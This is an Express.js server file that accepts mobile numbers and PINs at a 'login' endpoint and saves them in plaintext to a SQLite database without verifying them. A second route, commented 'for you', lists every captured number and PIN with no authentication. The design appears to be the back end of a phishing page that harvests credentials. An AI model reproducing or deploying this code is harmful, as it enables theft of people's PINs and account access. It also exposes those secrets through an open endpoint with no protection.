// server.js
const express = require("express");
const path = require("path");
const sqlite3 = require("sqlite3").verbose();
const bodyParser = require("body-parser");

const app = express();
const PORT = 3000;

// ====== DATABASE SETUP (SQLite file: logins.db) ======
const db = new sqlite3.Database("./logins.db");

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS logins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      mobile TEXT NOT NULL,
      pin TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// ====== MIDDLEWARE ======
app.use(bodyParser.json());

// Serve static frontend from /public
app.use(express.static(path.join(__dirname, "public")));

// ====== API: SAVE LOGIN ======
app.post("/api/login", (req, res) => {
  const { mobile, pin } = req.body;

  if (!mobile || !pin) {
    return res
      .status(400)
      .json({ success: false, message: "Mobile and PIN required" });
  }

  const stmt = db.prepare(
    "INSERT INTO logins (mobile, pin) VALUES (?, ?)"
  );

  stmt.run(mobile, pin, function (err) {
    if (err) {
      console.error("DB error:", err);
      return res
        .status(500)
        .json({ success: false, message: "Database error" });
    }

    return res.json({
      success: true,
      id: this.lastID,
      mobile,
      message: "Login saved",
    });
  });
});

// ====== API: VIEW ALL LOGINS (for you) ======
app.get("/api/logins", (req, res) => {
  db.all(
    "SELECT id, mobile, pin, created_at FROM logins ORDER BY created_at DESC",
    (err, rows) => {
      if (err) {
        console.error("DB error:", err);
        return res
          .status(500)
          .json({ success: false, message: "Database error" });
      }
      res.json(rows);
    }
  );
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
